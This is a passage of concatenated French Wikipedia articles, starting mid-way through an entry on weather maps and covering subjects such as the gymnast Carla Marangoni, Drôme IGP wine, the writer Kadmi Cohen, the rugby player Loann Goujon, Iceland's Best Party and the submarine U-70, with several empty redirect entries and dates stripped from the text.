Pour cela des "prévisions de zone pour l'aviation" sont émises sous forme de textes ou de cartes pour la planification du vol. Ces dernières décrivent les systèmes météorologiques et les conditions associées de nuages, de visibilité, de givrage, de vent et de turbulence que vont rencontrer les avions lors de leurs vols au-dessus d'un territoire. Ces cartes météorologiques s'appellent "cartes TEMSI", pour "cartes du TEMps SIgnificatif" (en anglais : "significant weather chart").
L'information est disponible sur de nombreux sites internet. Par exemple, aux États-Unis, le National Weather Service offre un site consacré aux prévisions aéronautiques. Ce site offre sous forme de textes ou de graphiques toute l'information nécessaire aux pilotes, comme les vents au sol et en altitude, la turbulence, etc. Des sites spécialisés privés offrent aussi des prévisions spécifiques pour les pilotes de planeur, de deltaplane ou de parapente.
Maritime.
De la même façon, les services météorologiques émettent des cartes pour la navigation fluviale et océanique. Les plus générales vont être des cartes de prévision de surface montrant les systèmes météorologiques et leur déplacement. Elles sont très utiles aux navires pour planifier leurs déplacements. D'autres plus spécialisées donnent les conditions de vents, de l'état de la mer (vagues et houle), de précipitations, de température de surface de la mer, etc. En particulier, il y a des cartes spécialement émises par les centres régionaux spécialisés de l’Organisation météorologique mondiale pour indiquer les régions qui seront affectées par les cyclones tropicaux.
Grand public.
Les orages destructeurs, les tempêtes de neige, les ouragans sont tous des phénomènes qui nécessitent une très grande attention de la part des météorologues à la prévision, ou "prévisionnistes". Une fois l'analyse du potentiel violent faite, le météorologue doit prévoir le déplacement des masses d'air et des déclencheurs.
Il regarde où les modèles déplacent ses trouvailles et grâce aux modèles à fine échelle peut raffiner sa prévision. Cependant, il doit toujours se méfier des résultats des modèles qui sont sujets à des erreurs de prévision. Finalement, il obtient une zone où le phénomène est probable et des sous-zones où il peut être violent.
Après tout ce travail, le prévisionniste enverra des cartes telles celles-ci pour prévenir la population des risques potentiels. Il enverra des bulletins de type alerte météorologique par la suite lorsque les mauvaises conditions s'approcheront.
Carte pour les médias.
Les médias écrit et télévisuels utilisent abondamment les cartes météorologiques dans les bulletins météorologiques. Il peut s'agir de simples cartes avec des symboles de soleil, nuages et précipitations pour donner le temps qu'il fera sur diverses localités. Ces cartes peuvent être un peu plus élaborées pour montrer la position de fronts, de dépressions et d'autres entités météorologiques mais elles restent généralement très simplifiées pour un auditoire non spécialisé.
Échelle.
Les cartes météorologiques peuvent couvrir différentes superficies. D'abord, il y a les cartes à grande échelle, dite échelle synoptique. Elles couvrent les phénomènes s'étendant de à de kilomètres et d'une durée de plusieurs jours. Ainsi les dépressions, les anticyclones et les creux barométriques font partie de cette échelle avec des diamètres allant jusqu'à . En général, ces cartes seront de l'ordre du continent, d'un hémisphère terrestres ou même du globe terrestre entier.
Puis les cartes de méso-échelle, qui décrit les phénomènes qui se passent à une échelle plus petite que l’échelle synoptique mais plus grands que celui des nuages individuels traités par la micro-échelle. En pratique, ce sont des dimensions horizontales entre et ce qui veut dire qui y traitent de phénomènes tels les lignes de grain, les complexes convectifs de méso-échelle (CCM) et autres orages organisés.
Plus l'échelle est petite, plus les détails sont fins et plus les effets locaux sont montrés. Les isolignes seront tracés à des intervalles plus petits (ex. 1 ou au lieu de 4) également.

</doc>
<doc id="7278623" url="https://fr.wikipedia.org/wiki?curid=7278623" title="Matthias-Gymnasium">
Matthias-Gymnasium



</doc>
<doc id="7278624" url="https://fr.wikipedia.org/wiki?curid=7278624" title="Carla Marangoni">
Carla Marangoni

Carla Marangoni, née le à Pavie et morte le dans la même ville, est une gymnaste artistique italienne. Bien qu'elle s'appelle "Carla", de nombreuses sources reportent erronément le prénom "Clara".
À son décès, elle était l'ultime survivante médaillée olympique des Jeux de 1928.
Carrière et biographie.
Carla Marangoni remporte aux Jeux olympiques d'été de 1928 à Amsterdam la médaille d'argent du concours général par équipes féminin avec Bianca Ambrosetti (1914-1928), Lavinia Gianoni (1911-2005), Luigina Perversi (1914-1983), Diana Pizzavini (1911-1989), Anna Luisa Tanzini, Carolina Tronconi, Ines Vercesi, Rita Vittadini, Virginia Giorgi, Germana Malabarba et Luigina Giavotti. Il s'agit de la première médaille olympique remportée par une équipe sportive féminine italienne.
Après les Jeux d'Amsterdam, Carla Marangoni abandonne la gymnastique mais continue de se maintenir en forme. Elle a longtemps travaillé à la Motorisation Civile de Pavie ; elle a été l'une des premières femmes italiennes à obtenir le permis de conduire et le permis bateau. Personnalité très indépendante, elle n'a jamais voulu se marier.
Avant son décès, Carla était la dernière survivante parmi les médaillés aux Jeux olympiques de 1928. Elle était également la médaillée olympique vivante dont l'attribution de la médaille est la plus ancienne.

</doc>
<doc id="7278626" url="https://fr.wikipedia.org/wiki?curid=7278626" title="Clara Marangoni">
Clara Marangoni



</doc>
<doc id="7278627" url="https://fr.wikipedia.org/wiki?curid=7278627" title="Marangoni">
Marangoni



</doc>
<doc id="7278628" url="https://fr.wikipedia.org/wiki?curid=7278628" title="Drôme (IGP)">
Drôme (IGP)

Le drôme, appelé vin de pays de la Drôme jusqu'en 2009, est un vin français d'indication géographique protégée (le nouveau nom des vins de pays). Cette production de vin était labellisée vin de pays par décret de l'INAO depuis le .
Histoire.
Les vestiges archéologiques (amphores en particulier) prouvent que dès le , la viticulture a façonné le paysage drômois. De plus, lors de la crise due au phylloxéra, la pépinière viticole du département avec sa production de vignes-mères de porte greffe et de plants de vignes pérennisa son orientation vitivinicole. Sa production est d'ailleurs la seconde après l'arboriculture. 
Le « vin de pays de la Drôme » fut reconnu par le décret du . Ce vin possède le label européen IGP (indication géographique protégée) qui a remplacé le label VDP (vin de pays) depuis 2009. Le cahier des charges a été modifié en novembre 2025.
Géographie.
Orographie et géologie.
Ses reliefs montagneux, d'altitude moyenne (1 300 à 1 500 m), peuvent être divisé en deux : les massifs préalpins et la dépression rhodanienne. Ils sont coupés par les trois vallées de la Drôme au nord, de l'Eygues et de l'Ouvèze au sud. Leurs strates géologiques sédimentaires vont de l’ère secondaire (Trias) à l'ère quaternaire. On y trouve des sols caillouteux "argilo-calcaires" et des sols d'épandages caillouteux (sur les pentes et les reliefs) qui offrent à la vigne une alimentation en eau régulière et la restitution, durant la nuit, de la chaleur emmagasinée le jour. 
Climat.
De type continental au nord, le climat de la Drôme devient méditerranéen au sud. Les deux tiers orientaux du département sont marqués par une influence montagnarde, qui s'impose au-dessus de 600 à 700 m d'altitude. Il existe deux types de vent principaux : le mistral et le marin, qui souffle du sud. Le premier assèche l'air tandis que le second apporte l'air humide de la Méditerranée. Ces vents peuvent être violents notamment en vallée du Rhône mais ils sont bénéfiques et nécessaires au développement de la vigne.
Vignoble.
Présentation.
Le territoire de l'indication géographique protégée « Drôme » s'étend sur près de 135 km du nord au sud, et sur une centaine de kilomètres d'est en ouest. Son vignoble bénéficie d'un climat tempéré-méditerranéen avec influences montagnarde et continentale et d'un terroir fait de sols calcaires et granitiques.
Conditions de production.
Les vins bénéficiant de l’indication géographique protégée « Drôme » présentent un titre 
alcoométrique volumique acquis au moins égal à 9 %. Le rendement maximum à l’hectare de 120 hectolitres. 
Types de vin.
Cette IGP présente une gamme de vins très variées : trois couleurs rouge, blanc et rosé, en primeur et en vins mousseux. Les vins rouges dominent largement la production (80%). En plus deux dénominations géographiques fournissent des vins d’une qualité différente et supérieure, le Comté de Grignan et les Coteaux de Montélimar, dans le cadre de l’IGP Méditerranée, qui peut être suivie de ces deux dénominations.
Encépagement.
Les cépages principaux sont la syrah N, le gamay N, le merlot N pour les rouges et rosé; pour les blancs le viognier B, le chardonnay B et la roussanne B. 
Commercialisation.
Ces vins sont commercialisés avec un excellent rapport qualité/prix. Le logo IGP de l'Union européenne figure sur l'étiquetage lorsque la mention « Indication géographique
protégée » est remplacée par la mention traditionnelle « Vin de Pays ».

</doc>
<doc id="7278638" url="https://fr.wikipedia.org/wiki?curid=7278638" title="Unterseeboot 70">
Unterseeboot 70

Unterseeboot 70 ou U-70 est le nom de plusieurs sous-marins allemands ou U-boot durant la Première et la Seconde Guerre mondiale:

</doc>
<doc id="7278640" url="https://fr.wikipedia.org/wiki?curid=7278640" title="Unterseeboot 71">
Unterseeboot 71

Unterseeboot 71 ou U-71 est le nom de plusieurs sous-marins allemands ou U-boot durant la Première et la Seconde Guerre mondiale:

</doc>
<doc id="7278642" url="https://fr.wikipedia.org/wiki?curid=7278642" title="Kadmi Cohen">
Kadmi Cohen

Kadmi Cohen, né le à Łódź (Royaume de Pologne), en Empire russe, est un écrivain français, d'origine juive qui défendra très tôt sa position pour le sionisme. Il est déporté pendant la Seconde Guerre mondiale à Auschwitz où il meurt en .
Biographie.
Isaac Kadmi-Cohen est né le à Łódź, en Pologne (alors partie de l'Empire russe). Ses parents l'envoient en Palestine à l'époque ottomane, en 1910, à Tel Aviv, nouvellement créée pour étudier à l'école secondaire et pour apprendre et perfectionner son français. Eux-mêmes, fortement imprégnés des idées sionistes, émigreront en Palestine sous mandat britannique, après la Première Guerre mondiale.
Très rapidement, Isaac Cohen se prend d'amour pour la France, et en , dès le début de la Première Guerre mondiale, il s'engage en tant que volontaire dans la Légion étrangère pour participer à ce qu'il considère comme une « guerre de libération contre les puissances centrales ». Il prend alors le nom de Kadmi Cohen en référence à Cadmos, fondateur de la ville de Thèbes dans la mythologie grecque.
Démobilisé, il décide de rester en France, fait des études de droit et obtient sa licence le . Il prête serment peu après, le . Profitant de la loi sur la naturalisation des volontaires étrangers, il acquiert la nationalité française par un décret du , et le , il est admis au barreau de Paris. Il se marie alors avec une jeune française catholique, qui se convertira au judaïsme et en 1922, avec sept autres jeunes confrères, il crée une association qui prendra quelques mois plus tard le nom de "Union des Jeunes Avocats de Paris" (UJAP). En 1928, il est fondateur et président de l'Association des anciens combattants volontaires juifs.
Son combat principal en tant que journaliste et écrivain, va rapidement être lié au mouvement sioniste. En , il passe une thèse de philosophie à la Faculté de droit de l'université de Paris, intitulé: "Introduction à l'histoire des institutions sociales et politiques chez les Sémites", dans laquelle il soutient la différence entre le "sémitisme" et le "non-sémitisme" sur la base de la relation avec la terre et le pouvoir. Quelques années plus tard, en 1929, il publie son œuvre considérée comme la plus originale "Nomades. Essai sur l’âme juive", qui développe le thème de sa thèse de doctorat. Un an plus tard, en 1930, il fait paraitre l'essai "L'abomination américaine. Essai politique" où il critique le matérialisme américain et soutient une nouvelle Europe des peuples. La même année, il publie "L'État d'Israël" qu'il dédie à son ami Anatole de Monzie, où il expose sa thèse du "pansémitisme".
À partir de 1929, il collabore de façon assidue à la revue "Mercure de France". Ses articles sont principalement axés sur l'antisémitisme et la question juive. Au début des années 1930, il sympathise avec le parti sioniste révisionniste de Vladimir Jabotinsky, mais est également favorable à un rapprochement entre la Troisième République et la cause sioniste: il soutient entre autres un accord entre les chrétiens maronites et la direction sioniste pour la colonisation du Liban.
À la veille de la Seconde Guerre mondiale, il se rapproche du canaanisme d'Ada Gourevich, partisan d'un projet politique pansémite au Proche-Orient, englobant Juifs et Arabes. 
En 1941, Kadmi Cohen est emprisonné au camp de Royallieu, près de Compiègne. Pendant son internement, il fonde le mouvement "Massada" pour la renaissance du judaïsme de la Diaspora et la création d'un État juif. Le nom du mouvement rappelle l'héroïque défense des Juifs à Massada, dans le désert de Judée, contre les Romains en 73.
Relâché de Royallieu en début 1942, il publie son manifeste et s'installe chez son frère qui demeure près de Vichy. Avec l'aide de l'ancien jésuite Joseph Catry, il entre en contact avec André Lavagne, secrétaire privé du maréchal Pétain, à qui il exprime ses idées. Son projet d'une émigration massive des Juifs de France vers la Palestine aurait suscité quelques sympathies chez les autorités collaborationnistes, mais a été fortement combattu par les institutions juives de France telles que l'Union des Juifs français à Paris et le consistoire de Lyon. Lors d'une de ses interventions auprès du Gouvernement de Vichy, il défend son idée qui, selon lui est :
La possibilité de faire quitter la France aux Juifs avec autant d'efficacité que les Allemands, mais humainement, volontairement et en vertu d'un accord international et non plus par la violence, en wagons à bestiaux, d'une manière qui était gravement dommageable au prestige de la France à l'étranger.
Début 1944, Kadmi Cohen, âgé de , est de nouveau arrêté cette fois par la Gestapo, envoyé au camp de Drancy et déporté par le convoi , en date du au camp de Gleiwitz, un des sous-camps du camp d'extermination d'Auschwitz-Birkenau, où il meurt en . Il laisse derrière lui, sa femme et trois enfants (Jean-François Steiner (*1938), Josée Steiner (*1939) et Olivier Cohen-Steiner, professeur à l'Université de Paris X (1936-2019).
L'affaire Treblinka.
L'attitude équivoque de Kadmi Cohen pendant la guerre est remise en question plusieurs années après sa mort, lors de la publication en 1966 par son fils Jean-François Steiner du roman "Treblinka. La révolte d'un camp d'extermination". L'œuvre est préfacée par Simone de Beauvoir, et raconte le soulèvement armé des Juifs dans le camp d'extermination. Ce livre, qui repose en partie sur les témoignages de certains survivants, suscite de virulentes critiques polémiques dans la presse pour sa présentation antihistorique et irréaliste de la condition des Juifs prisonniers, et pour son attaque des dirigeants juifs de l'époque. L'action des leaders juifs pendant la Seconde Guerre mondiale avait déjà été mise en cause quelques années auparavant par Hannah Arendt dans son livre La "Banalité du mal" publié en 1963 après le procès d'Adolf Eichmann.
Pour de nombreux critiques, le mariage de Jean-François Steiner avec Grit von Brauchitsch, la petite-fille du "Generalfeldmarschall" Walther von Brauchitsch, ancien chef d'état-major de l'armée allemande et accusé de crime de guerre, confirme sa . Dans les années 1990, Jean-François Steiner fera de nouveau parler de lui en défendant Maurice Papon, accusé de collaboration sous le gouvernement de Vichy.

</doc>
<doc id="7278643" url="https://fr.wikipedia.org/wiki?curid=7278643" title="U-71">
U-71



</doc>
<doc id="7278644" url="https://fr.wikipedia.org/wiki?curid=7278644" title="U-70">
U-70



</doc>
<doc id="7278648" url="https://fr.wikipedia.org/wiki?curid=7278648" title="Loann Goujon">
Loann Goujon

Loann Goujon, né le à Albertville ou Combronde (France), est un joueur international français de rugby à XV évoluant aux postes de troisième ligne centre, troisième ligne aile et deuxième ligne.
Formé tout d'abord au RC Combronde puis au RC Vichy, il rejoint le centre de formation de l'ASM Clermont Auvergne et fait ensuite ses débuts professionnels avec ce club. Parti gagner du temps de jeu au Stade rochelais, il connaît sa première sélection en équipe de France en 2015 avant de rejoindre l'Union Bordeaux Bègles la même année. Trois ans plus tard, il rejoint le Lyon OU avec qui il remporte le Challenge européen en 2022. Ayant pris sa retraite sportive à l'issue de la saison 2023-2024, il rechausse les crampons au niveau amateur dans son premier club formateur du RC Combronde à partir de la saison 2025-2026.
Biographie.
Loann Goujon naît le à Albertville ou Combronde selon les sources. À l'âge de 14 ans, il commence la pratique du rugby à XV au sein du . Deux ans plus tard, il joue une saison au RC Vichy et signe ensuite à l'ASM Clermont en 2006, intégrant par la suite le centre de formation du club.
En début d'année 2009, il est sélectionné en équipe de France des moins de 20 ans et prend part au Tournoi des Six Nations qu'il remporte. Au mois de mai, il dispute la finale du Championnat de France espoirs avec son club mais ils sont défaits par les Brivistes qui s'imposent grâce à un plus grand nombre d'essais marqués malgré un score de parité 19 partout. En fin de saison, il participe au Championnat du monde junior.
Lors de la saison 2009-2010, il est notamment sacré champion de France espoirs en étant titulaire en finale contre le SU Agen. L'année suivante, toujours en tant que titulaire, son club réussit le doublé en s'imposant 26 à 19 contre le RC Toulon.
Après avoir fait ses débuts en professionnel en Top 14 durant la saison 2011-2012 avec l'ASM Clermont, Loann Goujon est prêté au Stade rochelais pour la saison 2012-2013 de Pro D2, à la suite de laquelle, il s'engage pour une durée de deux années supplémentaires avec le club de La Rochelle.
En , après avoir réalisé de bonnes performances avec son club du Stade rochelais, il est appelé par Philippe Saint-André pour disputer le Tournoi des Six Nations avec le "XV de France". Il entre en toute fin du premier match de la compétition, contre l'Écosse, et célèbre ainsi sa première sélection. Il joue finalement tous les matchs du Tournoi, où la France finit à la . Il termine la compétition titulaire, à la place de Damien Chouly, et aux côtés de Thierry Dusautoir et Bernard Le Roux.
Présent dans la pré-liste destinée à préparer la Coupe du monde 2015, il n'est finalement pas retenu pour disputer la compétition.
À partir de la saison 2015-2016, Loann Goujon quitte le Stade rochelais pour s'engager avec l'Union Bordeaux Bègles. Durant son passage à l'Union Bordeaux Bègles, il continue d'être régulièrement convoqué en équipe de France par le nouveau sélectionneur Guy Novès.
Lors de l'intersaison 2018, il change de club et rejoint le Lyon OU. L'année suivante, il intègre l'EM Lyon Business School. Au mois de , en tant que remplaçant, il remporte le Challenge européen avec son club du Lyon OU lors d'une victoire 30 à 12 contre le RC Toulon.
Par la suite, il annonce prendre sa retraite du rugby à XV professionnel à l'issue de la saison 2023-2024. Il effectue son jubilé au stade des Lignières à Combronde en .
Finalement, pour la saison 2025-2026, il annonce reprendre les crampons pour jouer avec son premier club formateur, le RC Combronde, en Régionale 2.
Statistiques en équipe nationale.
Loann Goujon compte dont huit en tant que titulaire, de sa première sélection le au stade de France face à l'Écosse à sa dernière le contre l'Afrique du Sud.
Il participe à trois éditions du Tournoi des Six Nations, en 2015, 2016 et 2017&lt;ref name="Five/Six Nations"&gt;.&lt;/ref&gt;. 

</doc>
<doc id="7278651" url="https://fr.wikipedia.org/wiki?curid=7278651" title="Station de métro Place-des-Arts">
Station de métro Place-des-Arts



</doc>
<doc id="7278654" url="https://fr.wikipedia.org/wiki?curid=7278654" title="John Dakyn">
John Dakyn

John Dakyn (né en 1497 et mort le ) est un prêtre et historien anglais. Il est archidiacre du Yorkshire de l'Est et chroniqueur du Pèlerinage de Grâce.
Carrière.
John Dakyn commence sa carrière cléricale avec le poste de chancelier de l'évêque de Bath et Wells, William Knight, et devient bientôt son exécuteur testamentaire et son vicaire général tandis que Knight était absent pour assister l'archidiacre de Richmond. En 1551, il obtient le poste de vicaire général du diocèse d'York et est nommé archidiacre du Yorkshire de l'Est. En 1554, il devient recteur de Kirkby Ravensworth. En 1556, il y crée une école et un hospice.
Alors qu'il est responsable du nord de l'Angleterre, Dakyn se construit une sordide réputation en brûlant les hérétiques au cours des trois dernières années du règne de Marie d'Angleterre, comme le confirme la phrase de John Foxe : .

</doc>
<doc id="7278655" url="https://fr.wikipedia.org/wiki?curid=7278655" title="John Glassco">
John Glassco

John Stinson Glassco, né le à Montréal et mort dans cette ville le , est un poète, écrivain et traducteur canadien. Il est un ancien du Bishop's College School.
Biographie.
Canadien anglophone, John Glassco entreprit des études supérieures à l'Université McGill où il rejoignit le , aux côtés de Leon Edel, A.M. Klein, Leo Kennedy, F.R. Scott, A.J.M. Smith, promoteurs d'une écriture résolument contemporaine ou expérimentale qui s'inscrivait par exemple dans la lignée d'un Ezra Pound, T.S. Eliot ou e.e. cummings.
Âgé de 17 ans, il abandonne ses études pour Paris et s'installe dans le quartier du Montparnasse où il fréquente la bohème littéraire, devenant proche de la génération perdue. En 1970, dans "Memoirs of Montparnasse", il revint sur ses années passées en France.
En 1931, atteint de tuberculose, il revint au Canada pour y être hospitalisé et perdit un poumon.
En 1935, il se retira à Foster et devint maire du village entre 1952 et 1954.
Durant les années 1950-70, il traduisit de nombreux poètes francophones dont Hector de Saint-Denys Garneau, Monique Bosco, Jean-Charles Harvey, et commit également quelques écrits érotiques publiés entre autres chez Olympia Press. Il acheva "Under the Hill or the story of Venus and Tannhauser", le roman d'Aubrey Beardsley.
Le a été créé en son honneur en 1982 par l'.

</doc>
<doc id="7278657" url="https://fr.wikipedia.org/wiki?curid=7278657" title="Église Saint-Augustin de Saint-Claude">
Église Saint-Augustin de Saint-Claude

L'église Saint-Augustin de Saint-Claude est une église catholique située à Saint-Claude au sud de l'île de Basse-Terre en Guadeloupe. Église paroissiale depuis 1859, elle est dédiée à saint Augustin d'Hippone.
Histoire.
L'église est construite à partir de 1843 sur le site de l'ancienne chapelle privée de la famille Lepelletier de Montéran. Elle est dédiée par l'abbé Brien le , consacrée en 1858 par l'évêque de la Guadeloupe, Théodore-Augustin Forcade, à Augustin d'Hippone (en raison de leur prénom commun) et finie à la fin des années 1860. Elle est consacrée paroisse le . En 1932, l'architecte Ali Tur réhabilite le clocher et la sacristie de l'église et édifie un nouveau presbytère.
La chapelle du Vœu de Matouba est rattachée à la paroisse de Saint-Augustin.
Architecture et ornements.
L'église est complétée dans ses murs principaux vers 1858. Le clocher de l'église est érigée en 1868 et les cloches posées le de l'année suivante. La façade de l'édifice, du style des églises sud-américaines, est ornée en 1910 des statues de Paul et Pierre de chaque côté du portail principal en complément de celle d'Augustin située au-dessus portail.
La nef principale est encadrée par deux nefs latérales.

</doc>
<doc id="7278660" url="https://fr.wikipedia.org/wiki?curid=7278660" title="Conrad Brunkman">
Conrad Brunkman

Conrad Brunkman, né le à Helsingborg et mort le à Lund, est un rameur d'aviron suédois. 

</doc>
<doc id="7278662" url="https://fr.wikipedia.org/wiki?curid=7278662" title="Konrad Brunkman">
Konrad Brunkman



</doc>
<doc id="7278664" url="https://fr.wikipedia.org/wiki?curid=7278664" title="Hopène">
Hopène

L'hopène, ou diploptène, est un hydrocarbure de formule brute . Il s'agit d'un triterpène pentacyclique de la famille des hopanoïdes et résultant de la déshydrogénation de l'hopane. Il est présent notamment dans les membranes de nombreuses bactéries, où il joue un rôle structurel équivalent à celui du cholestérol chez les eucaryotes.

</doc>
<doc id="7278665" url="https://fr.wikipedia.org/wiki?curid=7278665" title="Mouvement de Défense de la Bicyclette">
Mouvement de Défense de la Bicyclette



</doc>
<doc id="7278667" url="https://fr.wikipedia.org/wiki?curid=7278667" title="Meilleur parti">
Meilleur parti

Le Meilleur parti (en islandais "Besti flokkurinn") est un parti politique islandais fondé le . Il a fusionné avec Avenir radieux. Il compte parmi ses rangs l'ancien maire de Reykjavik, Jón Gnarr. En 2010, le parti avait remporté une majorité relative de sièges au conseil municipal de Reykjavik et gouvernait aux côtés de l'Alliance.
Histoire.
Le parti a été créé comme parti satirique par Jón Gnarr, acteur humoriste islandais. À partir de la conception d'un personnage de politique véreux en 2008 destiné à des sketches télévisés, Jón Gnarr transforme cette idée en vidéos de parti satirique nommé « Meilleur parti » et les poste sur le Net. 
Devant le succès des vidéos, il décide de créer et présenter son parti aux élections, qui mêle avancées sociales et promesses loufoques. Beaucoup d'Islandais souffrent alors des conséquences de la Crise économique mondiale de 2008, la faillite de la banque Lehman Brothers ainsi que des malversations des banquiers islandais. Jón Gnarr compose son équipe principalement avec des artistes comme Einar Örn Benediktsson, Óttarr Proppé et Björn Blöndal le bassiste de HAM, tous sans expérience politique. Jón Gnarr reconnaît dès le début qu'il ne pourra pas honorer une de ses promesses faites avant les élections. Comme il revendique que tous les autres partis islandais sont secrètement corrompus, il a promis d'être ouvertement corrompu ("« Nous pouvons faire encore plus de promesses que les autres partis parce que nous n'en tiendrons aucune »"). Son objectif initial était de faire de la satire dans des thèmes communs dans la politique islandaise, en partie en imitant les expressions standards, les expressions idiomatiques et le jargon utilisé par les politiciens islandais.
D'abord crédité de 0,7 % dans les sondages, les intentions de vote pour le parti de Jón Gnarr atteignent 10 %, puis le double après une campagne axée sur des vidéo simples et joyeuses. Jón Gnarr est éreinté et parfois insulté lors d'entretiens politiques par ses opposants politiques. Pourtant, les sondages grimpent à 38 % quinze jours avant le scrutin. Cependant, après son succès électoral comme maire de Reykjavik le , le parti devient beaucoup plus sérieux et montre un véritable intérêt pour gouverner. Il a des positions de gauche sur de nombreuses questions. Bien que Jón Gnarr s'identifie comme anarchiste, le parti dans son ensemble est plus proche du centre-gauche .
À la fin de 2012, le parti rejoint Avenir radieux, et participe aux élections législatives islandaises de 2013 sous ce nom. 
Le , le social-démocrate Dagur B. Eggertsson, ancien maire de 2007 à 2008, succède à Jón Gnarr au fauteuil de maire de Reykjavik, ce dernier devenant simple conseiller municipal, estimant que 
Plate-forme politique du parti.
Quelques-unes des propositions les plus loufoques :
Élection municipale à Reykjavik en 2010 et mandat de maire.
La première élection à laquelle a participé le parti était les élections locales à Reykjavik en 2010. Le programme du parti comportait des serviettes gratuites dans toutes les piscines de la ville, un ours polaire pour le zoo de la ville. Le parti a remporté 6 des 15 sièges du conseil municipal de Reykjavik et gouverne la ville avec l'Alliance comme partenaire de la coalition. Le , Jón Gnarr est déclaré maire de Reykjavik, capitale de l'Islande où vivent ou y travaillent environ les deux tiers de la population .
Au moment de la prise de fonction, la situation économique de la ville est catastrophique. Jón Gnarr, malgré ses promesses de « fun », augmente dans un premier temps les prix, fait des coupes dans les services publics et les budgets, regroupe les écoles maternelles. Cependant, en dépensant peu, lui et son équipe développent un vrai plan d'urbanisme, créent des ateliers d'art et des hôtels qui font redémarrer le tourisme et l'immobilier, si bien que le maire obtient 38 % d'opinion favorable dans les sondages. Jón Gnarr quitte pourtant le statut de maire en 2014 pour devenir conseiller municipal et fait disparaître le nom de Meilleur parti.

</doc>
<doc id="7278668" url="https://fr.wikipedia.org/wiki?curid=7278668" title="Anna Olsson">
Anna Olsson



</doc>
<doc id="7278670" url="https://fr.wikipedia.org/wiki?curid=7278670" title="Mouvement de défense de la bicyclette">
Mouvement de défense de la bicyclette



</doc>
<doc id="7278674" url="https://fr.wikipedia.org/wiki?curid=7278674" title="Unterseeboot 70 (1940)">
Unterseeboot 70 (1940)

Le Unterseeboot 70 (ou U-70) est un sous-marin (U-Boot) allemand de type VII C de la Kriegsmarine pendant la Seconde Guerre mondiale.
Historique.
Mis en service le , l'U-70 sert initialement de sous-marin d'entrainement au sein de la 7. Unterseebootsflottille à Kiel.&lt;br&gt;
Le , l'U-70 devient opérationnel toujours dans la 7. Unterseebootsflottille.
Il appareille le du port de Kiel pour sa première patrouille de combat sous les ordres du Kapitänleutnant "Joachim Matz", en recherche à l'ouest des îles britanniques. Après en mer, ayant coulé un navire de et endommagé navires pour un total de , l'U-70 est coulé le au sud-est de l'Islande à la position géographique de , par des charges de profondeur lancées par les corvettes britanniques "HMS Camellia" et "HMS Arbutus". 
Parmi les d'équipage, sont secourus.
Navires coulés.
L'Unterseeboot 70 a coulé 1 navire marchand de 820 tonneaux et a endommagé 3 navires marchands pour un total de 20 484 tonneaux au cours de l'unique patrouille (16 jours en mer) qu'il effectua.

</doc>
<doc id="7278675" url="https://fr.wikipedia.org/wiki?curid=7278675" title="Louis Adam">
Louis Adam



</doc>
<doc id="7278676" url="https://fr.wikipedia.org/wiki?curid=7278676" title="CIDH">
CIDH



</doc>
<doc id="7278678" url="https://fr.wikipedia.org/wiki?curid=7278678" title="Prix Shirley-Jackson">
Prix Shirley-Jackson

Le prix Shirley-Jackson est un prix littéraire attribué depuis 2008 et récompensant des ouvrages de suspense et d'horreur psychologique tels qu'en écrivait Shirley Jackson. Cette récompense a rapidement acquis une certaine réputation dans son domaine. La cérémonie de remise des prix a lieu annuellement au mois de juillet et les lauréats sont choisis par un jury composé d'écrivains, d'éditeurs, de critiques littéraires et d’universitaires.
L'année officielle du prix correspond à l'année d'éligibilité des œuvres en compétition et non pas à l'année d'attribution du prix.

</doc>
<doc id="7278680" url="https://fr.wikipedia.org/wiki?curid=7278680" title="François Gaspard Balthazar Adam">
François Gaspard Balthazar Adam



</doc>
<doc id="7278684" url="https://fr.wikipedia.org/wiki?curid=7278684" title="Pierre Antoine Huot de Goncourt">
Pierre Antoine Huot de Goncourt

Pierre Antoine Victor Huot de Goncourt est un homme politique français né le à Bourmont (Haute-Marne) et décédé le à Neufchâteau (Vosges).
Biographie.
Entré à l'école Polytechnique en 1799, il passe en 1801 à l'école d'artillerie de Châlons. Il quitte l'armée en 1811 avec le grade de capitaine et devient entreposeur de tabacs à Neufchâteau. Il est destitué par la Restauration. 
Il est député des Vosges de 1848 à 1851, siégeant à droite comme républicain conservateur. Il est l'oncle de Jules et Edmond de Goncourt.

</doc>
<doc id="7278687" url="https://fr.wikipedia.org/wiki?curid=7278687" title="Eirik Greibrokk Dolve">
Eirik Greibrokk Dolve

Eirik Greibrokk Dolve (né le à Bergen) est un athlète norvégien, spécialiste du saut à la perche.
Biographie.
Son record de date de à Kuortane. En franchissant à Rieti, il remporte la médaille d'or des Championnats d'Europe juniors le .
En 2014, il se classe neuvième des Championnats du monde juniors avec . Lors des Championnats d'Europe par équipes à Tcheboksary, Dolve porte son record personnel à . Le , à Göteborg, il efface une barre à . 
Le à Prague, Eirik Dolve bat son record de en effaçant une barre à pour se classer du concours derrière Jan Kudlička (, NR). 
Vie privée.
Il est ami depuis plus de dix ans avec la hurdleuse Isabelle Pedersen, les deux athlètes étant tous les deux de la ville de Bergen.

</doc>
<doc id="7278689" url="https://fr.wikipedia.org/wiki?curid=7278689" title="Plebeius artaxerxes">
Plebeius artaxerxes



</doc>
<doc id="7278690" url="https://fr.wikipedia.org/wiki?curid=7278690" title="Sam Hutchinson">
Sam Hutchinson

 
Samuel Edward "Sam" Hutchinson, né le à Windsor, est un footballeur anglais qui évolue au poste de défenseur.
Carrière en club.
En club.
Les premières années.
Né à Windsor (Berkshire), Hutchinson est le fils d'Eddie Hutchinson, qui avait joué avec l'équipe des jeunes de Chelsea avant de faire carrière dans le non-league football. Hutchinson rejoint l'Académie de Chelsea à l'âge de 9 ans et fait ses débuts en équipe première en mai 2007, à l'âge de 18 ans.
Chelsea.
En août 2007, il signe un nouveau contrat de 4 ans avec le club anglais. Plus tard dans le mois, Ian Holloway, gestionnaire du club de Plymouth Argyle, déclare publiquement son intérêt de vouloir obtenir Sam Hutchinson, en prêt. En août 2010, alors âgé de 21 ans, Hutchinson prend sa retraite professionnel en raison d'une blessure récurrente au genou. Il a été annoncé qu'il travaillerait en collaboration avec l'Académie de Chelsea tout en continuant à étudier à l'université. En décembre 2011, il a signé un nouveau contrat d'un an et demi avec Chelsea après une "amélioration significative" de son problème au genou qui l'avait forcé à quitter le monde du foot.
Nottingham Forest.
